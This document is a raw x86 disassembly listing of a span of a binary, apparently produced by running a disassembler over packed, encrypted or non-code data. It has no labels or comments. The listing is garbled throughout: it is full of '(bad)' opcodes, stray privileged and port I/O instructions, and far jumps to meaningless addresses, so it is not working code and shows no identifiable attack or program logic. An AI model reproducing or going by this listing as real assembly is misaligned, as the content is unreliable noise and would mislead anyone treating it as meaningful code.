  408774:	enter  0x2869,0x2a
  408778:	pop    ebx
  408779:	inc    esp
  40877a:	xchg   edx,eax
  40877b:	jns    0x408790
  40877d:	aad    0x1c
  40877f:	enter  0xb7c6,0xfb
  408783:	outs   dx,DWORD PTR ds:[esi]
  408784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408785:	imul   DWORD PTR [ecx]
  408787:	add    eax,0x87aea700
  40878c:	push   0x19
  40878e:	inc    esi
  40878f:	sbb    al,0xef
  408791:	pop    edx
  408792:	(bad)
  408796:	and    al,0x89
  408798:	outs   dx,BYTE PTR ds:[esi]
  408799:	ss mov eax,0xe1b5f9e6
  40879f:	adc    DWORD PTR [edx*4+0x2ba1fe99],ecx
  4087a6:	lock pop eax
  4087a8:	jp     0x408747
  4087aa:	rol    DWORD PTR [edx+0x30],cl
  4087ad:	fst    QWORD PTR [esi+ebp*8-0x3d]
  4087b1:	dec    esi
  4087b2:	ss inc edi
  4087b4:	fs fs fwait
  4087b7:	test   DWORD PTR [edi-0xd],esi
  4087ba:	push   ss
  4087bb:	cld    
  4087bc:	xchg   edi,eax
  4087bd:	lods   eax,DWORD PTR ds:[esi]
  4087be:	js     0x408743
  4087c0:	sar    DWORD PTR [edi],1
  4087c2:	rcl    DWORD PTR [ecx],1
  4087c4:	dec    esi
  4087c5:	sahf   
  4087c6:	pop    es
  4087c7:	pop    esi
  4087c8:	lahf   
  4087c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087ca:	jnp    0x4087f4
  4087cc:	add    eax,0x6cb97b1b
  4087d1:	dec    esi
  4087d2:	push   eax
  4087d3:	(bad)  
  4087d4:	scas   al,BYTE PTR es:[edi]
  4087d5:	dec    eax
  4087d6:	fadd   DWORD PTR [edx-0x52]
  4087d9:	dec    ecx
  4087da:	mov    eax,0x4bd9987b
  4087df:	sahf   
  4087e0:	xchg   DWORD PTR [esi],ecx
  4087e2:	add    eax,0x9f58383
  4087e7:	sub    esi,eax
  4087e9:	icebp  
  4087ea:	jle    0x4087eb
  4087ec:	ins    BYTE PTR es:[edi],dx
  4087ed:	aaa    
  4087ee:	sbb    BYTE PTR [edi],al
  4087f0:	ins    BYTE PTR es:[edi],dx
  4087f1:	adc    eax,DWORD PTR [edx+0x3814de19]
  4087f7:	enter  0x7985,0x86
  4087fb:	sbb    BYTE PTR [esi],dl
  4087fd:	push   ecx
  4087fe:	xor    DWORD PTR [edi-0x14],esp
  408801:	push   0x53
  408803:	jle    0x408837
  408805:	shl    DWORD PTR [ebx-0x50],1
  408808:	mov    edi,0x8d594f6c
  40880d:	ins    BYTE PTR es:[edi],dx
  40880e:	jnp    0x408811
  408810:	mov    edi,0x951d436b
  408815:	xor    eax,0xe65c6db2
  40881a:	(bad)  
  40881b:	mov    dl,0x4b
  40881d:	mov    eax,ds:0x5dcc0c52
  408822:	(bad)  
  408823:	xlat   BYTE PTR ds:[ebx]
  408824:	jae    0x4087f3
  408826:	xchg   BYTE PTR [eax+0x4a],bl
  408829:	neg    DWORD PTR [ebx+0x24]
  40882c:	push   edx
  40882d:	jge    0x408891
  40882f:	sbb    eax,ebx
  408831:	mov    ah,0xf3
  408833:	mov    esp,ds
  408835:	add    DWORD PTR [edx-0x3f0fdbe1],0x3
  40883c:	(bad)  
  40883e:	aas    
  40883f:	scas   eax,DWORD PTR es:[edi]
  408840:	pop    edi
  408841:	std    
  408842:	jmp    0xf4c2:0x60515442
  408849:	pop    es
  40884a:	callw  0x8ab3
  40884e:	mov    ah,0x9d
  408850:	cli    
  408851:	sahf   
  408852:	ss push 0xffffffef
  408855:	sbb    edi,DWORD PTR [ecx]
  408857:	or     DWORD PTR [ebp-0x60],eax
  40885a:	gs xchg ecx,eax
  40885c:	daa    
  40885d:	mov    al,0xe
  40885f:	clc    
  408860:	mov    cl,0x84
  408862:	mov    edx,0xf303bbb8
  408867:	adc    cl,BYTE PTR [ebx+0x15f61f38]
  40886d:	jg     0x40885a
  40886f:	fst    QWORD PTR [ebx-0x48]
  408872:	push   esp
  408873:	and    esp,DWORD PTR fs:[edi-0x4d]
  408877:	pushf  
  408878:	inc    edi
  408879:	mov    ecx,0x75320a0a
  40887e:	or     BYTE PTR [eax+0x7e],ah
  408881:	or     ebp,0x22
  408884:	inc    eax
  408885:	mov    dl,0x64
  408887:	lahf   
  408888:	dec    edi
  408889:	sub    BYTE PTR [edx-0x29],bl
  40888c:	mov    al,BYTE PTR cs:[ecx]
  40888f:	xchg   DWORD PTR [ebx+0x1fcfc66],esi
  408895:	ja     0x40884d
  408897:	test   al,0x23
  408899:	aam    0x88
  40889b:	or     bh,BYTE PTR ds:0x13c92f1a
  4088a1:	xor    al,0x7f
  4088a3:	cdq    
  4088a4:	xchg   esp,eax
  4088a5:	dec    ebx
  4088a6:	outs   dx,BYTE PTR ds:[esi]
  4088a7:	jg     0x4088a8
  4088a9:	adc    BYTE PTR [esi+0x2d6cb16a],dh
  4088af:	sub    esp,DWORD PTR [ecx-0x4e10767e]
  4088b5:	jge    0x40887e
  4088b7:	sbb    DWORD PTR [edx*8+0x3d8cd073],ebp
  4088be:	jnp    0x4088b3
  4088c0:	in     eax,0x91
  4088c2:	mov    ebp,?
  4088c4:	ror    BYTE PTR [esi+0x8ccb52d],0xfd
  4088cb:	sbb    DWORD PTR [eax-0x5b7edd02],0xffffffd7
  4088d2:	dec    eax
  4088d3:	dec    esp
  4088d4:	inc    edi
  4088d5:	hlt    
  4088d6:	outs   dx,BYTE PTR ds:[esi]
  4088d7:	adc    BYTE PTR [ecx],bh
  4088d9:	mov    ch,0x4f
  4088db:	retf   
  4088dc:	aam    0x98
  4088de:	icebp  
  4088df:	jp     0x4088e0
  4088e1:	fiadd  WORD PTR [ecx+ebx*1]
  4088e4:	jmp    0x527ad68b
  4088e9:	mov    al,ds:0xab32b78d
  4088ee:	pop    es
  4088ef:	imul   esp,DWORD PTR [esi+ebx*2-0x7a],0xffffff90
  4088f4:	daa    
  4088f5:	or     esi,DWORD PTR [edi+0x5c]
  4088f8:	adc    eax,0x1170f111
  4088fd:	shr    BYTE PTR [ebx-0x2b7fb5c4],0xbf
  408904:	push   ebx
  408905:	mov    ah,0xe2
  408907:	add    DWORD PTR [ebx-0x4a],ebp
  40890a:	mov    dh,0x57
  40890c:	ret    0xf5f8
  40890f:	test   BYTE PTR [ecx+0x43],dl
  408912:	mov    dl,BYTE PTR ds:0x198d1f1e
  408918:	dec    edi
  408919:	mov    eax,ds:0x88ffe768
  40891e:	jnp    0x4088c1
  408920:	or     al,0x6f
  408922:	dec    ecx
  408923:	fidiv  WORD PTR [ebx+eiz*4+0x7e180ec7]
  40892a:	test   bh,0x34
  40892d:	stos   DWORD PTR es:[edi],eax
  40892e:	sub    eax,0x1fee7a1
  408933:	cli    
  408934:	cwde   
  408935:	mov    cl,0x57
  408937:	dec    edi
  408938:	xchg   esi,eax
  408939:	mov    al,ds:0x5a85d88f
  40893e:	sbb    ecx,DWORD PTR [esi]
  408940:	dec    eax
  408941:	mov    dh,0xc1
  408943:	jb     0x40895f
  408945:	add    al,0xda
  408947:	js     0x4089af
  408949:	mov    ah,0x67
  40894b:	push   ebx
  40894c:	out    dx,al
  40894d:	icebp  
  40894e:	inc    eax
  40894f:	jp     0x408946
  408951:	push   edi
  408952:	add    esi,DWORD PTR [ebp+0x75]
  408955:	fidiv  DWORD PTR [ecx+0x48f87f09]
  40895b:	xor    dh,ch
  40895d:	add    bh,0xea
  408960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408961:	clc    
  408962:	sbb    DWORD PTR [edi-0x31],edi
  408965:	dec    esi
  408966:	push   ss
  408967:	xchg   ecx,eax
  408968:	push   0xffffffe2
  40896a:	js     0x40894a
  40896c:	xor    ecx,ebx
  40896e:	push   0x40
  408970:	inc    edx
  408971:	dec    esi
  408972:	mov    es,WORD PTR [ebp+ebp*1+0x65]
  408976:	or     eax,0xffffffc1
  408979:	and    ah,ah
  40897b:	cmp    BYTE PTR [eax],bh
  40897d:	in     al,dx
  40897e:	cwde   
  40897f:	or     BYTE PTR [edx],ch
  408981:	sar    bh,0x2c
  408984:	sbb    BYTE PTR ds:0x1259035e,bh
  40898a:	xor    eax,0xfca4908a
  40898f:	repnz shr DWORD PTR [edi-0x284fed55],0x94
  408997:	adc    eax,0xf1465dd8
  40899c:	sbb    al,0x14
  40899e:	in     al,dx
  40899f:	or     ecx,DWORD PTR [ecx+0x1b]
  4089a2:	xchg   edi,eax
  4089a3:	mov    ebp,0xf2555d1f
  4089a8:	xlat   BYTE PTR ds:[ebx]
  4089a9:	scas   al,BYTE PTR es:[edi]
  4089aa:	sti    
  4089ab:	(bad)
  4089ae:	mov    esi,ebx
  4089b0:	sub    DWORD PTR fs:[ebx+0x1067d859],edi
  4089b7:	inc    edi
  4089b8:	leave  
  4089b9:	popf   
  4089ba:	outs   dx,BYTE PTR ds:[esi]
  4089bb:	sbb    ch,BYTE PTR [eax]
  4089bd:	ficomp WORD PTR [edi-0x228d8e16]
  4089c3:	rol    DWORD PTR [edi],1
  4089c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089c6:	sahf   
  4089c7:	std    
  4089c8:	scas   eax,DWORD PTR es:[edi]
  4089c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089ca:	aas    
  4089cb:	je     0x4089db
  4089cd:	dec    ebx
  4089ce:	out    dx,al
  4089cf:	inc    eax
  4089d0:	sub    BYTE PTR [ebp-0x53],al
  4089d3:	jl     0x4089cb
  4089d5:	(bad)  
  4089d6:	mov    ebx,0x2d058917
  4089db:	inc    ebx
  4089dc:	in     al,dx
  4089dd:	jle    0x408997
  4089df:	mov    ah,0x64
  4089e1:	xlat   BYTE PTR ds:[ebx]
  4089e2:	or     al,0x55
  4089e4:	dec    esi
  4089e5:	out    dx,al
  4089e6:	neg    al
  4089e8:	sub    eax,0x25ac1707
  4089ed:	test   al,0x3c
  4089ef:	jmp    0xb7b:0xc7e6331f
  4089f6:	sbb    DWORD PTR [ebx-0xddec02e],ebp
  4089fc:	inc    edx
  4089fd:	pushf  
  4089fe:	mov    al,ds:0xa0c69e2d
  408a03:	cld    
  408a04:	xlat   BYTE PTR ds:[ebx]
  408a05:	xor    edi,DWORD PTR [edi+0x55]
  408a08:	ins    DWORD PTR es:[edi],dx
  408a09:	(bad)  
  408a0a:	mov    al,0x96
  408a0c:	inc    edi
  408a0d:	sahf   
  408a0e:	and    al,0x2b
  408a10:	add    esi,0x7e0402db
  408a16:	xor    BYTE PTR [esi],bl
  408a18:	push   es
  408a19:	inc    ebx
  408a1a:	push   ss
  408a1b:	mov    eax,0xdd88837e
  408a20:	dec    esp
  408a21:	fstp   DWORD PTR ds:0x67db4ab4
  408a27:	and    BYTE PTR [edx+eax*1-0x14],cl
  408a2b:	into   
  408a2c:	cs fs xchg edx,eax
  408a2f:	push   eax
  408a30:	jbe    0x408a3a
  408a32:	sub    al,0x35
  408a34:	retf   
  408a35:	xchg   DWORD PTR [esi+0xf],ebp
  408a38:	das    
  408a39:	and    al,0xdf
  408a3b:	out    dx,eax
  408a3c:	sbb    BYTE PTR [ebp-0x10],ch
  408a3f:	or     BYTE PTR [esi-0x6560919e],ch
  408a45:	jbe    0x408a4b
  408a47:	ins    DWORD PTR es:[edi],dx
  408a48:	rcl    ebx,cl
  408a4a:	loopne 0x408aba
  408a4c:	ret    
  408a4d:	mov    BYTE PTR [ebx+0x46],bh
  408a50:	aaa    
  408a51:	test   eax,0x64cb2dd1
  408a56:	test   esp,esp
  408a58:	test   eax,0x40b27100
  408a5d:	sar    DWORD PTR [esi],1
  408a5f:	inc    edx
  408a60:	jmp    0xf491781d
  408a65:	sbb    DWORD PTR [eax+0x3c],eax
  408a68:	jg     0x408a0c
  408a6a:	ret    
  408a6b:	fwait
  408a6c:	pop    ds
  408a6d:	push   ecx
  408a6e:	test   DWORD PTR [eax-0x1df703e0],esi
  408a74:	xor    al,0xe0
  408a76:	pop    ds
  408a77:	inc    ebx
  408a78:	mov    ecx,0xc5c8ab89
  408a7d:	mov    ebx,0xd480ee1c
  408a82:	mov    edi,DWORD PTR [ecx-0xa]
  408a85:	shl    BYTE PTR [esi+0x61],cl
  408a88:	out    dx,al
  408a89:	in     al,0x2a
  408a8b:	test   al,0x81
  408a8d:	jno    0x408aff
  408a8f:	ins    BYTE PTR es:[edi],dx
  408a90:	inc    edi
  408a91:	push   esp
  408a92:	mov    edi,0xee651d6e
  408a97:	outs   dx,BYTE PTR ds:[esi]
  408a98:	cmp    al,0x4d
  408a9a:	ret    0xf12b
  408a9d:	scas   eax,DWORD PTR es:[edi]
  408a9e:	in     eax,dx
  408a9f:	out    dx,al
  408aa0:	int    0x5e
  408aa2:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408aa4:	xchg   edi,eax
  408aa5:	mov    ebx,0x1a93453d
  408aaa:	fcomp  QWORD PTR [ebx-0xc73c169]
  408ab0:	mov    bl,0xaa
  408ab2:	mov    ebx,es
  408ab4:	dec    ebp
  408ab5:	inc    eax
  408ab6:	inc    esi
  408ab7:	fwait
  408ab8:	mov    esp,0x955426a3
  408abd:	cmp    esi,DWORD PTR [ebp-0x11]
  408ac0:	inc    ebx
  408ac1:	mov    ds:0x3fb34241,eax
  408ac6:	push   ss
  408ac7:	out    dx,al
  408ac8:	(bad)  
  408ac9:	lods   eax,DWORD PTR ds:[esi]
  408aca:	std    
  408acb:	es sub al,0xce
  408ace:	loop   0x408ae4
  408ad0:	mov    ds:0x55ba8aab,al
  408ad5:	xchg   edx,eax
  408ad6:	xlat   BYTE PTR ds:[ebx]
  408ad7:	ret    0x8dca
  408ada:	ret    
  408adb:	jb     0x408b5b
  408add:	aas    
  408ade:	mov    eax,0xe3c8abfd
  408ae3:	int    0x6d
  408ae5:	idiv   BYTE PTR [esi+0x7057e17e]
  408aeb:	ss push 0x52247a8f
  408af1:	(bad)  
  408af2:	rcr    DWORD PTR ds:0x3ad83ed5,1
  408af8:	shr    ecx,cl
  408afa:	pushf  
  408afb:	mov    esi,0x49dfbd07
  408b00:	sbb    eax,0x76506d84
  408b05:	jns    0x408a92
  408b07:	xlat   BYTE PTR ds:[ebx]
  408b08:	ret    
  408b09:	adc    BYTE PTR ds:0x456a89fe,0x89
  408b10:	enter  0xe4fe,0x9
  408b14:	scas   al,BYTE PTR es:[edi]
  408b15:	mov    esp,0x4f0b8426
  408b1a:	(bad)  
  408b1b:	dec    ebp
  408b1c:	xor    al,0x6c
  408b1e:	popa   
  408b1f:	leave  
  408b20:	or     eax,0x749faf7
  408b25:	dec    esi
  408b26:	out    dx,al
  408b27:	lods   al,BYTE PTR ds:[esi]
  408b28:	jne    0x408b5d
  408b2a:	mov    al,ds:0x3ec41a1e
  408b2f:	aad    0xb6
  408b31:	lods   al,BYTE PTR ds:[esi]
  408b32:	test   eax,0xfaf4aa14
  408b37:	int3   
  408b38:	xor    esi,DWORD PTR [eax+eax*2]
  408b3b:	inc    esi
  408b3c:	sub    DWORD PTR [eax-0x3f],0xffffffdf
  408b40:	fadd   DWORD PTR [edi]
  408b42:	aas    
  408b43:	test   BYTE PTR ss:[ecx+0x2f],dh
  408b47:	push   esp
  408b48:	rcl    DWORD PTR [edi],1
  408b4a:	push   edx
  408b4b:	cmp    ch,BYTE PTR [edi+0x35]
  408b4e:	in     eax,dx
  408b4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b50:	ins    DWORD PTR es:[edi],dx
  408b51:	test   eax,0x80cb9b28
  408b56:	cli    
  408b57:	ffree  st(3)
  408b59:	cwde   
  408b5a:	lock xchg edi,eax
  408b5c:	addr16 sub ch,bh
  408b5f:	xor    dl,al
  408b61:	ins    DWORD PTR es:[edi],dx
  408b62:	addr16 dec edx
  408b64:	xchg   ecx,eax
  408b65:	shl    DWORD PTR [ebp-0x65],cl
  408b68:	nop
  408b69:	inc    esi
  408b6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b6b:	sbb    BYTE PTR [ebp-0x1ddbede5],0xa0
  408b72:	daa    
  408b73:	out    0xaa,eax
  408b75:	cmp    eax,0x6980970a
  408b7a:	loopne 0x408be3
  408b7c:	push   eax
  408b7d:	mov    bl,dl
  408b7f:	sti    
  408b80:	add    cl,BYTE PTR [eax+esi*1+0x74]
  408b84:	mov    cl,0xdd
  408b86:	call   0xf862ec3e
  408b8b:	jecxz  0x408bd6
  408b8d:	fstp   QWORD PTR [ebx]
  408b8f:	stos   BYTE PTR es:[edi],al
  408b90:	outs   dx,BYTE PTR ds:[esi]
  408b91:	jnp    0x408b51
  408b93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b95:	fsub   st,st(3)
  408b97:	repnz cli 
  408b99:	jb     0x408b5e
  408b9b:	rcr    bl,1
  408b9d:	mov    BYTE PTR [ebx+0x20],dl
  408ba0:	loopne 0x408b97
  408ba2:	loope  0x408bfd
  408ba4:	and    BYTE PTR [edi],al
  408ba6:	ss mov eax,0x2a9a80f9
  408bac:	es popf 
  408bae:	add    esp,DWORD PTR [ecx-0x2c2c43ea]
  408bb4:	test   ebx,0x7b1cb38
  408bba:	push   eax
  408bbb:	push   0x7061209e
  408bc0:	xchg   DWORD PTR ds:0x38763bec,eax
  408bc6:	shr    DWORD PTR [edx-0x7c],1
  408bc9:	int3   
  408bca:	push   ds
  408bcb:	mov    ss,WORD PTR [esi-0x79f0f1e4]
  408bd1:	adc    al,BYTE PTR [eax-0x1d1fc333]
  408bd7:	dec    ecx
  408bd8:	loopne 0x408b8f
  408bda:	or     al,0xe0
  408bdc:	hlt    
  408bdd:	cmp    eax,0x793360e3
  408be2:	mov    ds:0xf67e8cdb,eax
  408be7:	cmp    esp,ebp
  408be9:	and    BYTE PTR [ebx],dh
  408beb:	cmp    bl,BYTE PTR [ecx+edx*2+0x60]
  408bef:	pusha  
  408bf0:	pop    esi
  408bf1:	les    esp,FWORD PTR [edx-0x5f0f4cf6]
  408bf7:	mov    al,ds:0x53163c30
  408bfc:	dec    esi
  408bfd:	outs   dx,BYTE PTR ds:[esi]
  408bfe:	jne    0x408bfb
  408c00:	repnz (bad) 
  408c02:	out    dx,al
  408c03:	lods   al,BYTE PTR ds:[esi]
  408c04:	test   DWORD PTR [ecx],edi
  408c06:	jno    0x408c3f
  408c08:	mov    esi,0x6590eb92
  408c0d:	mov    dl,0xec
  408c0f:	xor    al,0xcb
  408c11:	cmp    eax,0x744dbf81
  408c16:	call   0x3c2f9725
  408c1b:	fwait
  408c1c:	test   DWORD PTR [edx],ecx
  408c1e:	dec    esi
  408c1f:	(bad)  
  408c20:	dec    ebx
  408c21:	sub    al,BYTE PTR [ebx-0x5a7465a8]
  408c27:	jecxz  0x408c7e
  408c29:	cmp    al,0xdf
  408c2b:	cmp    BYTE PTR [ecx],0xbb
  408c2e:	xchg   edx,eax
  408c2f:	std    
  408c30:	call   0x739e9613
  408c35:	repz cmp ebx,DWORD PTR [edx]
  408c38:	cmp    eax,0x25d1869b
  408c3d:	test   eax,0x1a16a957
  408c42:	lods   al,BYTE PTR ds:[esi]
  408c43:	jne    0x408c4c
  408c45:	dec    ecx
  408c46:	mov    dh,0x74
  408c48:	push   ebp
  408c49:	stos   BYTE PTR es:[edi],al
  408c4a:	loop   0x408cb5
  408c4c:	jmp    0x408c18
  408c4e:	fisttp WORD PTR [eax]
  408c50:	add    al,0xce
  408c52:	fucomp st(3)
  408c54:	inc    esp
  408c55:	xchg   edx,eax
  408c56:	or     eax,0x6602f95d
  408c5b:	lea    eax,[ecx-0x49ba0f0b]
  408c61:	cwde   
  408c62:	(bad)  
  408c63:	(bad)  
  408c64:	jl     0x408c23
  408c66:	or     DWORD PTR [ecx-0x3005ed96],eax
  408c6c:	fcmovnbe st,st(6)
  408c6e:	push   ecx
  408c6f:	jecxz  0x408c97
  408c71:	pop    edx
  408c72:	pop    ds
  408c73:	fadd   QWORD PTR [esi+esi*8]
  408c76:	cwde   
  408c77:	pop    ds
  408c78:	adc    DWORD PTR [edx+0x5db1fc3e],edx
  408c7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c7f:	pop    ds
  408c80:	or     eax,0xf93fde44
  408c85:	ins    DWORD PTR es:[edi],dx
  408c86:	popf   
  408c87:	sub    BYTE PTR [edi+0x5e],al
  408c8a:	ds pop es
  408c8c:	push   esp
  408c8d:	cmc    
  408c8e:	jb     0x408d0f
  408c90:	xlat   BYTE PTR fs:[ebx]
  408c92:	das    
  408c93:	jl     0x408c8b
  408c95:	xor    eax,0x817ea6f3
  408c9a:	sub    DWORD PTR [esi],edx
  408c9c:	jge    0x408d10
  408c9e:	or     DWORD PTR [edx+0x7a],0x26150f45
  408ca5:	fist   DWORD PTR [edi-0x3a]
  408ca8:	mov    bl,0xec
  408caa:	inc    ebx
  408cab:	mov    eax,0xcabdc7bb
  408cb0:	pop    ds
  408cb1:	rcr    BYTE PTR [ebx],1
  408cb3:	rcl    DWORD PTR fs:[eax-0x12],0x3d
  408cb8:	xchg   edi,eax
  408cb9:	jb     0x408d02
  408cbb:	jns    0x408c58
  408cbd:	push   edx
  408cbe:	(bad)  
  408cbf:	les    eax,FWORD PTR [eax+0x5b]
  408cc2:	xchg   ebp,eax
  408cc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cc4:	or     bl,al
  408cc6:	scas   eax,DWORD PTR es:[edi]
  408cc7:	and    BYTE PTR [ebp+0x1c],bh
  408cca:	fbld   TBYTE PTR [edx+0x38cc760d]
  408cd0:	mov    edi,0x370ad3cf
  408cd5:	cdq    
  408cd6:	mov    edi,0xa98d5c9
  408cdb:	mov    ebp,0x920f60bb
  408ce0:	mov    DWORD PTR [ecx],edx
  408ce2:	loopne 0x408c81
  408ce4:	mov    bl,0x4a
  408ce6:	push   0xa910a073
  408ceb:	xchg   edx,eax
  408cec:	sub    cl,dl
  408cee:	xchg   ecx,eax
  408cef:	cmp    dh,BYTE PTR [ecx]
  408cf1:	sbb    ebx,DWORD PTR [esi-0x6e]
  408cf4:	dec    ecx
  408cf5:	cmp    cl,bl
  408cf7:	call   0x24108abf
  408cfc:	or     al,ch
  408cfe:	mov    ecx,0x7708e3d
  408d03:	push   edx
  408d04:	push   ds
  408d05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d06:	js     0x408cd4
  408d08:	jb     0x408cbc
  408d0a:	inc    ebx
  408d0b:	push   cs
  408d0c:	fimul  DWORD PTR [edx+0x68]
  408d0f:	xadd   BYTE PTR ds:0x30d97415,dl
  408d16:	nop
  408d17:	jmp    0xb389ef3c
  408d1c:	push   ds
  408d1d:	stos   BYTE PTR es:[edi],al
  408d1e:	pop    ecx
  408d1f:	and    BYTE PTR [esi],al
  408d21:	sbb    BYTE PTR [esi-0x6528546a],dh
  408d27:	jmp    0xbc12:0xdc8accfb
  408d2e:	dec    esi
  408d2f:	jns    0x408da0
  408d31:	ins    DWORD PTR es:[edi],dx
  408d32:	inc    esi
  408d33:	mov    dh,0x8c
  408d35:	mov    ds:0x722babd4,eax
  408d3a:	and    al,0x25
  408d3c:	mov    ebx,0x771d4f1e
  408d41:	sbb    ch,BYTE PTR [edi-0x6251ae30]
  408d47:	jne    0x408d13
  408d49:	pusha  
  408d4a:	jb     0x408ccc
  408d4c:	xchg   BYTE PTR [esi],al
  408d4e:	aad    0xe9
  408d50:	pop    eax
  408d51:	sbb    al,0x9b
  408d53:	mov    eax,ds:0x132cac4d
  408d58:	jge    0x408cfc
  408d5a:	lods   eax,DWORD PTR ds:[esi]
  408d5b:	stc    
  408d5c:	sub    ebx,DWORD PTR [ebp-0xc17195c]
  408d62:	xchg   ebx,eax
  408d63:	sbb    al,bl
  408d65:	nop
  408d66:	xchg   ebx,eax
  408d67:	jp     0x408d9a
  408d69:	ins    BYTE PTR es:[edi],dx
  408d6a:	jecxz  0x408d35
  408d6c:	xchg   ebx,eax
  408d6d:	adc    eax,0x208c9f21
  408d72:	in     al,dx
  408d73:	js     0x408d88
  408d75:	repnz loop 0x408d99
  408d78:	adc    al,0xb9
  408d7a:	sub    DWORD PTR [ecx],esp
  408d7c:	pop    esp
  408d7d:	addr16 pop es
  408d7f:	shl    edx,cl
  408d81:	loope  0x408d8a
  408d83:	bound  ebp,QWORD PTR [eax]
  408d85:	stos   BYTE PTR es:[edi],al
  408d86:	test   esi,eax
  408d88:	leave  
  408d89:	add    ah,BYTE PTR [edi-0x6a]
  408d8c:	adc    ah,cl
  408d8e:	aad    0x3b
  408d90:	add    eax,0xebd718e5
  408d95:	into   
  408d96:	loope  0x408d7d
  408d98:	push   0xffbb4f3c
  408d9d:	or     al,0x59
  408d9f:	sub    DWORD PTR [ebx+0x60],eax
  408da2:	or     dl,al
  408da4:	retf   
  408da5:	mov    edx,0x32615765
  408daa:	or     ebp,DWORD PTR [eax]
  408dac:	mov    WORD PTR [ecx-0x46],ss
  408daf:	nop
  408db0:	add    BYTE PTR ds:0xbae804e2,al
  408db6:	dec    ebp
  408db7:	jg     0x408d40
  408db9:	fstp   QWORD PTR [ecx]
  408dbb:	jmp    0x408dc1
  408dbd:	and    al,ah
  408dbf:	fwait
  408dc0:	mov    WORD PTR [ebp-0x4792799c],?
  408dc6:	or     esi,DWORD PTR [esi+0x1023ec75]
  408dcc:	test   BYTE PTR [esi-0x46feed30],0x3e
  408dd3:	lds    esi,FWORD PTR [edi+0x53099434]
  408dd9:	loop   0x408d86
  408ddb:	jo     0x408da8
  408ddd:	jl     0x408da3
  408ddf:	int    0xed
  408de1:	mov    esi,ebx
  408de3:	jb     0x408dd7
  408de5:	dec    esp
  408de6:	cmp    DWORD PTR [esi+0x69af64ed],esp
  408dec:	ds ret 
  408dee:	xchg   DWORD PTR [edi+0x7e9c8fa8],edx
  408df4:	pop    ebp
  408df5:	lods   al,BYTE PTR ds:[esi]
  408df6:	xchg   DWORD PTR [esi],edx
  408df8:	loop   0x408e16
  408dfa:	retw   0xa6fd
  408dfe:	sbb    ebx,0x95728c25
  408e04:	inc    esi
  408e05:	inc    esp
  408e06:	or     eax,0x61982dda
  408e0b:	cwde   
  408e0c:	popf   
  408e0d:	mov    esp,0x15783ae4
  408e12:	sub    esi,ebp
  408e14:	fisubr DWORD PTR [ebx]
  408e16:	ss das 
  408e18:	jnp    0x408dc7
  408e1a:	out    dx,eax
  408e1b:	pop    ebp
  408e1c:	pop    ebx
  408e1d:	dec    edx
  408e1e:	mov    esi,0xc2b9c615
  408e23:	dec    ebx
  408e24:	xchg   ebx,eax
  408e25:	cmp    DWORD PTR [edi+0x192de250],ecx
  408e2b:	mov    al,ds:0xad6befaa
  408e30:	stos   DWORD PTR es:[edi],eax
  408e31:	aad    0xc
  408e33:	inc    ebp
  408e34:	jmp    0xe2d40527
  408e39:	idiv   DWORD PTR [di]
  408e3c:	push   esi
  408e3d:	pop    ebp
  408e3e:	lahf   
  408e3f:	pop    ebx
  408e40:	adc    eax,0x3bf6f520
  408e45:	mov    BYTE PTR [eax+0x53b55d9e],ah
  408e4b:	jmp    0x408e2f
  408e4d:	sub    eax,DWORD PTR [edi]
  408e4f:	add    al,0x5e
  408e51:	inc    edx
  408e52:	sub    al,0x59
  408e54:	push   esp
  408e55:	fisttp QWORD PTR [ebx+0x31817ed]
  408e5b:	into   
  408e5c:	dec    edx
  408e5d:	add    al,0xff
  408e5f:	ins    BYTE PTR es:[edi],dx
  408e60:	lds    esp,FWORD PTR [ecx+0x1a]
  408e63:	clc    
  408e64:	ins    DWORD PTR es:[edi],dx
  408e65:	stos   BYTE PTR es:[edi],al
  408e66:	call   0x2f83:0x4b3d4723
  408e6d:	pusha  
  408e6e:	cwde   
  408e6f:	and    ah,BYTE PTR [ecx-0x44]
  408e72:	dec    edi
  408e73:	sar    cl,1
  408e75:	pop    ebx
  408e76:	int    0x7
  408e78:	push   eax
  408e79:	(bad)  
  408e7a:	pop    edx
  408e7b:	(bad)  
  408e7c:	aas    
  408e7d:	imul   ebx,eax,0x0
  408e80:	shl    BYTE PTR [ebx-0x2a],1
  408e83:	fcom   QWORD PTR [esi+0x32136198]
  408e89:	popa   
  408e8a:	js     0x408f06
  408e8c:	add    al,0x4b
  408e8e:	pop    edx
  408e8f:	mov    eax,0x69f6f3bc
  408e94:	xor    DWORD PTR [esi+ebp*4+0x79848b41],0xcb88a0fc
  408e9f:	pop    ds
  408ea0:	(bad)  
  408ea1:	mov    ds:0xa67367f,al
  408ea6:	in     al,0x76
  408ea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ea9:	push   0xb95792a0
  408eae:	adc    al,al
  408eb0:	jg     0x408e70
  408eb2:	rcl    dl,0x1
  408eb5:	add    esi,ecx
  408eb7:	xchg   DWORD PTR [ebx+0x3fea2824],esp
  408ebd:	fsubr  DWORD PTR ds:0xf9edb6db
  408ec3:	xor    DWORD PTR [edi-0x67a3c890],ebx
  408ec9:	mov    cl,0xec
  408ecb:	mov    bl,0x76
  408ecd:	add    ecx,edi
  408ecf:	daa    
  408ed0:	and    bl,dl
  408ed2:	jae    0x408f2f
  408ed4:	cmp    al,0x9d
  408ed6:	cdq    
  408ed7:	adc    BYTE PTR [esi+0x1b85710a],dl
  408edd:	jg     0x408eb5
  408edf:	xor    al,0x53
  408ee1:	int3   
  408ee2:	pop    edx
  408ee3:	mov    ds,WORD PTR [esi-0x9f34a93]
  408ee9:	enter  0x9be0,0x65
  408eed:	sub    edx,DWORD PTR [eax-0x7e340d30]
  408ef3:	mov    ecx,0x21573c07
  408ef8:	dec    ecx
  408ef9:	retf   
  408efa:	dec    ebp
